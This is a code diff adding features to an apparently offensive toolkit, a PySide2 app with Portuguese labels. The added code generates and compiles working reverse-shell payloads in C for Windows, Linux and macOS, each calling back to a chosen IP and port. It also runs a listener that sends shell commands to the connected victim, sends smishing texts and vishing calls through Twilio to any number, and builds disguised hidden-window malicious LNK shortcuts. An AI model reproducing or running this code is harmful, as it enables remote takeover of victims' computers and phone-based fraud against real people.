@@ -8,6 +8,10 @@ from PySide2.QtCore import Qt
 from PySide2.QtCore import QTimer
 import sys
 import os
+import subprocess
+import threading
+import socket
+
 
 class DarkThemeApp(QMainWindow):
     def __init__(self):
@@ -29,18 +33,17 @@ class DarkThemeApp(QMainWindow):
         self.deepfake_tab = QWidget()
         self.c2_tab = QWidget()
         self.apt_tab = QWidget()
+        self.gsm_tab = QWidget()
+        self.lnk_tab = QWidget()
+
+
 
         self.tabs.addTab(self.artifacts_tab, "Gerar Artefatos Maliciosos")
         self.tabs.addTab(self.phishing_tab, "Phishing & Spear-Phishing")
         self.tabs.addTab(self.deepfake_tab, "Deepfake & Deepvoice Awareness")
         self.tabs.addTab(self.c2_tab, "C2 Simulado")
+        self.tabs.addTab(self.gsm_tab, "Smishing e Vishing")
         self.tabs.addTab(self.apt_tab, "Templates APT")
-
-        # Abas ainda vazias
-        for tab in [self.c2_tab, self.apt_tab]:
-            layout = QVBoxLayout()
-            layout.addWidget(QLabel("Em breve..."))
-            tab.setLayout(layout)
 
         # --- Aba Gerar Artefatos Maliciosos ---
         layout = QVBoxLayout()
@@ -172,6 +175,186 @@ class DarkThemeApp(QMainWindow):
         deepfake_layout.addWidget(self.deepvoice_status)
 
         self.deepfake_tab.setLayout(deepfake_layout)
+
+
+        # Seleção do tipo de sistema
+        c2_layout = QVBoxLayout()
+        self.c2_os_selector = QComboBox()
+        self.c2_os_selector.addItems(["Windows", "Linux", "macOS"])
+        self.c2_os_selector.setToolTip("Tipo de payload/sistema de destino")
+        c2_layout.addWidget(QLabel("Sistema Operacional de Destino:"))
+        c2_layout.addWidget(self.c2_os_selector)
+
+        # Seletor de plataforma
+        self.c2_platform_selector = QComboBox()
+        self.c2_platform_selector.addItems(["Windows", "Linux", "macOS"])
+        self.c2_platform_selector.setCurrentText("Windows")
+        c2_layout.addWidget(QLabel("Selecionar Plataforma do Payload:"))
+        c2_layout.addWidget(self.c2_platform_selector)
+
+        # Inputs de IP e Porta
+        self.c2_ip_input = QLineEdit()
+        self.c2_ip_input.setPlaceholderText("IP do Listener (ex: 127.0.0.1)")
+        c2_layout.addWidget(self.c2_ip_input)
+
+        self.c2_port_input = QLineEdit()
+        self.c2_port_input.setPlaceholderText("Porta (ex: 4444)")
+        c2_layout.addWidget(self.c2_port_input)
+
+        # Botão para gerar o payload
+        self.generate_payload_btn = QPushButton("Gerar Payload e Compilar")
+        self.generate_payload_btn.clicked.connect(self.generate_c2_payload)
+        c2_layout.addWidget(self.generate_payload_btn)
+
+        # Terminal de output
+        self.c2_terminal = QTextEdit()
+        self.c2_terminal.setReadOnly(True)
+        c2_layout.addWidget(self.c2_terminal)
+
+        # Comandos rápidos
+        self.cmd_buttons = []
+        self.cmds_container = QWidget()
+        self.cmds_layout = QVBoxLayout()
+        self.cmds_container.setLayout(self.cmds_layout)
+        c2_layout.addWidget(self.cmds_container)
+
+
+
+        # Campo de comando manual
+        self.manual_cmd = QLineEdit()
+        self.manual_cmd.setPlaceholderText("Digite um comando manual...")
+        c2_layout.addWidget(self.manual_cmd)
+
+        self.send_cmd_btn = QPushButton("Enviar Comando")
+        self.send_cmd_btn.clicked.connect(lambda: self.send_c2_command(self.manual_cmd.text()))
+        c2_layout.addWidget(self.send_cmd_btn)
+
+        self.c2_tab.setLayout(c2_layout)
+
+        # Parte de socket e payloads
+        self.listener_socket = None
+        self.client_socket = None
+        
+        # Seletor de APT
+
+        apt_layout = QVBoxLayout()
+
+        apt_layout.addWidget(QLabel("Selecione o Grupo APT:"))
+        self.apt_selector = QComboBox()
+        self.apt_selector.addItems(["APT29", "FIN7", "APT41"])
+        apt_layout.addWidget(self.apt_selector)
+
+        # Botão para gerar template
+        self.generate_apt_btn = QPushButton("Gerar Cadeia de Ataque")
+        self.generate_apt_btn.clicked.connect(self.generate_apt_chain)
+        apt_layout.addWidget(self.generate_apt_btn)
+
+        # Visualização do template
+        self.apt_output = QTextEdit()
+        self.apt_output.setReadOnly(True)
+        apt_layout.addWidget(self.apt_output)
+
+        # Status
+        self.apt_status = QLabel("Status: Aguardando seleção.")
+        apt_layout.addWidget(self.apt_status)
+
+        self.apt_tab.setLayout(apt_layout)
+
+        gsm_layout = QVBoxLayout()
+        gsm_layout.addWidget(QLabel("Número de Destino (com DDI):"))
+        self.gsm_number_input = QLineEdit()
+        self.gsm_number_input.setPlaceholderText("+5511999999999")
+        gsm_layout.addWidget(self.gsm_number_input)
+
+        # Escolher tipo: Smishing ou Vishing
+        self.gsm_type_selector = QComboBox()
+        self.gsm_type_selector.addItems(["Smishing (SMS)", "Vishing (Ligação)"])
+        gsm_layout.addWidget(QLabel("Tipo de Envio:"))
+        gsm_layout.addWidget(self.gsm_type_selector)
+
+        # --- Autenticação Twilio ---
+        gsm_layout.addWidget(QLabel("Twilio Account SID:"))
+        self.twilio_sid_input = QLineEdit()
+        gsm_layout.addWidget(self.twilio_sid_input)
+
+        gsm_layout.addWidget(QLabel("Twilio Auth Token:"))
+        self.twilio_token_input = QLineEdit()
+        self.twilio_token_input.setEchoMode(QLineEdit.Password)
+        gsm_layout.addWidget(self.twilio_token_input)
+
+        gsm_layout.addWidget(QLabel("Número de Envio (From):"))
+        self.twilio_from_input = QLineEdit()
+        self.twilio_from_input.setPlaceholderText("+15017122661")
+        gsm_layout.addWidget(self.twilio_from_input)
+
+        # Mensagem para SMS
+        gsm_layout.addWidget(QLabel("Corpo da Mensagem SMS:"))
+        self.gsm_msg_input = QTextEdit()
+        gsm_layout.addWidget(self.gsm_msg_input)
+
+        # Upload de Áudio
+        gsm_layout.addWidget(QLabel("Áudio para Ligação (URL ou upload local):"))
+        self.gsm_audio_path = QLineEdit()
+        self.gsm_audio_path.setPlaceholderText("https://dominio.com/audio.mp3 ou escolha abaixo")
+        gsm_layout.addWidget(self.gsm_audio_path)
+
+        self.gsm_audio_browse = QPushButton("Selecionar Arquivo de Áudio")
+        self.gsm_audio_browse.clicked.connect(self.select_audio_file)
+        gsm_layout.addWidget(self.gsm_audio_browse)
+
+        # Botão de envio
+        self.gsm_send_btn = QPushButton("Enviar")
+        self.gsm_send_btn.clicked.connect(self.send_gsm_action)
+        gsm_layout.addWidget(self.gsm_send_btn)
+
+        self.gsm_status = QLabel("Status: Aguardando ação...")
+        gsm_layout.addWidget(self.gsm_status)
+
+        self.gsm_tab.setLayout(gsm_layout)
+
+        #Gerador de LNK
+
+        self.lnk_tab = QWidget()
+        self.tabs.addTab(self.lnk_tab, "Gerador de LNK Malicioso")
+
+        lnk_layout = QVBoxLayout()
+
+        lnk_layout.addWidget(QLabel("Caminho do Executável ou Script (Payload):"))
+        self.lnk_payload_input = QLineEdit()
+        lnk_layout.addWidget(self.lnk_payload_input)
+
+        lnk_layout.addWidget(QLabel("Nome do Atalho (.lnk):"))
+        self.lnk_name_input = QLineEdit()
+        self.lnk_name_input.setPlaceholderText("exemplo.lnk")
+        lnk_layout.addWidget(self.lnk_name_input)
+
+        lnk_layout.addWidget(QLabel("Ícone Personalizado (opcional):"))
+        self.lnk_icon_input = QLineEdit()
+        lnk_layout.addWidget(self.lnk_icon_input)
+
+        self.lnk_icon_browse = QPushButton("Selecionar Ícone (.ico)")
+        self.lnk_icon_browse.clicked.connect(self.select_icon_file)
+        lnk_layout.addWidget(self.lnk_icon_browse)
+
+        lnk_layout.addWidget(QLabel("Local para salvar o atalho:"))
+        self.lnk_output_dir = QLineEdit()
+        lnk_layout.addWidget(self.lnk_output_dir)
+
+        self.lnk_dir_browse = QPushButton("Selecionar Pasta de Destino")
+        self.lnk_dir_browse.clicked.connect(self.select_output_folder)
+        lnk_layout.addWidget(self.lnk_dir_browse)
+
+        self.lnk_hidden_checkbox = QCheckBox("Executar em modo invisível")
+        lnk_layout.addWidget(self.lnk_hidden_checkbox)
+
+        self.lnk_generate_btn = QPushButton("Gerar Atalho Malicioso")
+        self.lnk_generate_btn.clicked.connect(self.generate_lnk_malware)
+        lnk_layout.addWidget(self.lnk_generate_btn)
+
+        self.lnk_status = QLabel("Status: Aguardando ação...")
+        lnk_layout.addWidget(self.lnk_status)
+
+        self.lnk_tab.setLayout(lnk_layout)
 
 
     def set_dark_theme(self):
@@ -723,6 +906,316 @@ End If
 
         threading.Thread(target=execute, daemon=True).start()
 
+    def generate_c2_payload(self):
+        ip = self.c2_ip_input.text().strip()
+        port = self.c2_port_input.text().strip()
+        target_os = self.c2_os_selector.currentText()
+
+        if not ip or not port:
+            QMessageBox.warning(self, "Erro", "Preencha IP e Porta corretamente.")
+            return
+
+        try:
+            os.makedirs("payloads", exist_ok=True)
+
+            if target_os == "Windows":
+                filename = "payloads/payload_windows.c"
+                exe_name = "payloads/payload_windows.exe"
+                payload_code = f'''
+    #include <winsock2.h>
+    #include <windows.h>
+    #pragma comment(lib, "ws2_32")
+
+    WSADATA wsa;
+    SOCKET sock;
+    struct sockaddr_in server;
+
+    int main() {{
+        WSAStartup(MAKEWORD(2,2), &wsa);
+        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+        server.sin_family = AF_INET;
+        server.sin_port = htons({port});
+        server.sin_addr.s_addr = inet_addr("{ip}");
+        connect(sock, (struct sockaddr*)&server, sizeof(server));
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESTDHANDLES;
+        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+        return 0;
+    }}'''
+                with open(filename, "w") as f:
+                    f.write(payload_code)
+                compile_cmd = f"x86_64-w64-mingw32-gcc {filename} -o {exe_name} -lws2_32"
+
+            elif target_os == "Linux":
+                filename = "payloads/payload_linux.c"
+                exe_name = "payloads/payload_linux"
+                payload_code = f'''
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <string.h>
+    #include <sys/socket.h>
+
+    int main() {{
+        int sock;
+        struct sockaddr_in attacker;
+
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        attacker.sin_family = AF_INET;
+        attacker.sin_port = htons({port});
+        attacker.sin_addr.s_addr = inet_addr("{ip}");
+
+        connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
+
+        dup2(sock, 0); // STDIN
+        dup2(sock, 1); // STDOUT
+        dup2(sock, 2); // STDERR
+
+        execl("/bin/sh", "sh", NULL);
+        return 0;
+    }}'''
+                with open(filename, "w") as f:
+                    f.write(payload_code)
+                compile_cmd = f"gcc {filename} -o {exe_name}"
+
+            elif target_os == "macOS":
+                filename = "payloads/payload_macos.c"
+                exe_name = "payloads/payload_macos"
+                payload_code = f'''
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <string.h>
+    #include <sys/socket.h>
+
+    int main() {{
+        int sock;
+        struct sockaddr_in attacker;
+
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        attacker.sin_family = AF_INET;
+        attacker.sin_port = htons({port});
+        attacker.sin_addr.s_addr = inet_addr("{ip}");
+
+        connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
+
+        dup2(sock, 0); // STDIN
+        dup2(sock, 1); // STDOUT
+        dup2(sock, 2); // STDERR
+
+        execl("/bin/zsh", "zsh", NULL);
+        return 0;
+    }}'''
+                with open(filename, "w") as f:
+                    f.write(payload_code)
+                compile_cmd = f"clang {filename} -o {exe_name}"
+
+            # Compilação
+            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                QMessageBox.information(self, "Sucesso", "Payload gerado com sucesso.")
+                
+                # ✅ Atualiza comandos padrão conforme plataforma
+                selected_platform = self.c2_platform_selector.currentText()
+                self.update_default_commands(selected_platform)
+                
+                # ✅ Inicia o listener
+                self.start_listener(ip, int(port))
+            else:
+                QMessageBox.critical(self, "Erro", f"Erro ao compilar:\n{result.stderr}")
+
+        except Exception as e:
+            QMessageBox.critical(self, "Erro", f"Falha ao gerar payload:\n{str(e)}")
+
+
+    def start_listener(self, ip, port):
+        def listener():
+            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.listener_socket.bind((ip, port))
+            self.listener_socket.listen(1)
+            self.c2_terminal.append("[+] Aguardando conexão...")
+            self.client_socket, addr = self.listener_socket.accept()
+            self.c2_terminal.append(f"[+] Conectado com: {addr}\n")
+            while True:
+                try:
+                    output = self.client_socket.recv(4096).decode(errors='ignore')
+                    if output:
+                        self.c2_terminal.append(output)
+                except:
+                    break
+
+        threading.Thread(target=listener, daemon=True).start()
+
+    def send_c2_command(self, command):
+        if self.client_socket:
+            try:
+                self.client_socket.sendall((command + "\n").encode())
+                self.manual_cmd.clear()
+            except Exception as e:
+                self.c2_terminal.append(f"[Erro ao enviar comando]: {str(e)}")
+        else:
+            self.c2_terminal.append("[!] Nenhum cliente conectado ainda.")
+
+    def update_default_commands(self, platform):
+        # Remove botões antigos
+        for btn in self.cmd_buttons:
+            btn.deleteLater()
+        self.cmd_buttons.clear()
+
+        if platform == "Windows":
+            commands = ["whoami", "ipconfig", "dir", "tasklist", "powershell"]
+        elif platform == "Linux":
+            commands = ["whoami", "ifconfig", "ls", "ps aux", "uname -a"]
+        elif platform == "macOS":
+            commands = ["whoami", "ifconfig", "ls", "ps -ax", "sw_vers"]
+
+        for cmd in commands:
+            btn = QPushButton(f"Executar: {cmd}")
+            btn.clicked.connect(lambda checked=False, c=cmd: self.send_c2_command(c))
+            self.cmds_layout.addWidget(btn)
+            self.cmd_buttons.append(btn)
+
+    def select_audio_file(self):
+        from PySide2.QtWidgets import QFileDialog
+        file_path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo de Áudio", "", "Áudio (*.mp3 *.wav)")
+        if file_path:
+            self.gsm_audio_path.setText(file_path)
+
+
+    def send_gsm_action(self):
+        from twilio.rest import Client
+        import os
+
+        sid = self.twilio_sid_input.text().strip()
+        token = self.twilio_token_input.text().strip()
+        from_number = self.twilio_from_input.text().strip()
+        to_number = self.gsm_number_input.text().strip()
+        tipo = self.gsm_type_selector.currentText()
+        msg = self.gsm_msg_input.toPlainText().strip()
+        audio_url = self.gsm_audio_path.text().strip()
+
+        if not sid or not token or not from_number:
+            QMessageBox.warning(self, "Erro", "Preencha as credenciais do Twilio (SID, Token e Número From).")
+            return
+
+        if not to_number:
+            QMessageBox.warning(self, "Erro", "Preencha o número de destino.")
+            return
+
+        try:
+            client = Client(sid, token)
+
+            if "Smishing" in tipo:
+                if not msg:
+                    QMessageBox.warning(self, "Erro", "Digite a mensagem SMS.")
+                    return
+
+                message = client.messages.create(
+                    body=msg,
+                    from_=from_number,
+                    to=to_number
+                )
+                self.gsm_status.setText(f"✅ SMS enviado com sucesso! SID: {message.sid}")
+
+            elif "Vishing" in tipo:
+                if audio_url.startswith("http"):
+                    call = client.calls.create(
+                        twiml=f'<Response><Play>{audio_url}</Play></Response>',
+                        from_=from_number,
+                        to=to_number
+                    )
+                    self.gsm_status.setText(f"📞 Ligação iniciada com sucesso! SID: {call.sid}")
+                else:
+                    QMessageBox.warning(self, "Erro", "Insira uma URL de áudio válida para ligação (ex: https://.../audio.mp3)")
+                    return
+
+        except Exception as e:
+            QMessageBox.critical(self, "Erro", f"Erro ao enviar:\n{str(e)}")
+
+    def generate_apt_chain(self):
+        apt = self.apt_selector.currentText()
+        chains = {
+            "APT29": [
+                "Spear Phishing Attachment (T1566.001)",
+                "Malicious DOC with Macro",
+                "PowerShell Downloader",
+                "Command & Control Channel (HTTPS)",
+                "Credential Dumping (T1003)"
+            ],
+            "FIN7": [
+                "Spear Phishing Link (T1566.002)",
+                "HTA Dropper Executed via wscript",
+                "C2 com Empire Framework",
+                "Credential Access com mimikatz",
+                "Persistence via Registry Run Key"
+            ],
+            "APT41": [
+                "Phishing com PDF",
+                "DLL Sideloading",
+                "Cobalt Strike Beacon",
+                "Lateral Movement via RDP",
+                "Exfil via Cloud API"
+            ]
+        }
+
+        template = chains.get(apt, [])
+        if template:
+            self.apt_output.setPlainText(" → ".join(template))
+            self.apt_status.setText(f"✅ Cadeia de ataque de {apt} gerada.")
+        else:
+            self.apt_output.clear()
+            self.apt_status.setText("❌ Erro: APT não reconhecido.")
+
+    def generate_lnk_malware(self):
+        import pythoncom
+        from win32com.client import Dispatch
+
+        target = self.lnk_payload_input.text().strip()
+        name = self.lnk_name_input.text().strip()
+        icon = self.lnk_icon_input.text().strip()
+        output = self.lnk_output_dir.text().strip()
+        hidden = self.lnk_hidden_checkbox.isChecked()
+
+        if not all([target, name, output]):
+            QMessageBox.warning(self, "Erro", "Preencha todos os campos obrigatórios.")
+            return
+
+        try:
+            shortcut = Dispatch("WScript.Shell").CreateShortcut(os.path.join(output, name))
+            shortcut.TargetPath = target
+            shortcut.WorkingDirectory = os.path.dirname(target)
+
+            if icon:
+                shortcut.IconLocation = icon
+
+            if hidden:
+                shortcut.WindowStyle = 7  # Minimizado (invisível)
+
+            shortcut.Save()
+            self.lnk_status.setText(f"✅ Atalho criado em: {os.path.join(output, name)}")
+        except Exception as e:
+            self.lnk_status.setText(f"❌ Erro: {str(e)}")
+
+    def select_icon_file(self):
+        from PySide2.QtWidgets import QFileDialog
+        file_path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo de Ícone", "", "Ícones (*.ico)")
+        if file_path:
+            self.lnk_icon_input.setText(file_path)
+
+    def select_output_folder(self):
+        from PySide2.QtWidgets import QFileDialog
+        folder_path = QFileDialog.getExistingDirectory(self, "Selecionar Pasta de Destino")
+        if folder_path:
+            self.lnk_output_dir.setText(folder_path)
 
 
 import asyncio
